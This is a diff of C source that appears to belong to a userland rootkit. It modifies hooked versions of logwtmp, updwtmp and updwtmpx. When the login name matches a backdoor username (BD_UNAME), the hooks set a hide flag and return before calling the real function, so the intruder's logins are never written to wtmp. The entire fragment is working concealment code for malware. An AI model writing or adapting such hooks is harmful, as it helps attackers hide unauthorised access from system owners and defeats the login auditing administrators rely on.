@@ -25,10 +25,11 @@
 void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host){
     if(hide_me) return;
 
-    if(!strncmp(BD_UNAME, ut_name, strlen(BD_UNAME)))
+    if(!strncmp(BD_UNAME, ut_name, strlen(BD_UNAME))){
         hide_me = 1;
+        return;
+    }
 
-    if(hide_me) return;
     hook(CLOGWTMP);
     call(CLOGWTMP, ut_line, ut_name, ut_host);
 }
@@ -37,11 +38,12 @@ void updwtmp(const char *wfile, const struct utmp *ut){
     if(hide_me) return;
 
     if(ut && ut->ut_user != NULL){
-        if(!strncmp(BD_UNAME, ut->ut_user, strlen(BD_UNAME)))
+        if(!strncmp(BD_UNAME, ut->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
+            return;
+        }
     }
 
-    if(hide_me) return;
     hook(CUPDWTMP);
     call(CUPDWTMP, wfile, ut);
 }
@@ -50,11 +52,12 @@ void updwtmpx(const char *wfilex, const struct utmpx *utx){
     if(hide_me) return;
 
     if(utx && utx->ut_user != NULL){
-        if(!strncmp(BD_UNAME, utx->ut_user, strlen(BD_UNAME)))
+        if(!strncmp(BD_UNAME, utx->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
+            return;
+        }
     }
 
-    if(hide_me) return;
     hook(CUPDWTMPX);
     call(CUPDWTMPX, wfilex, utx);
 }
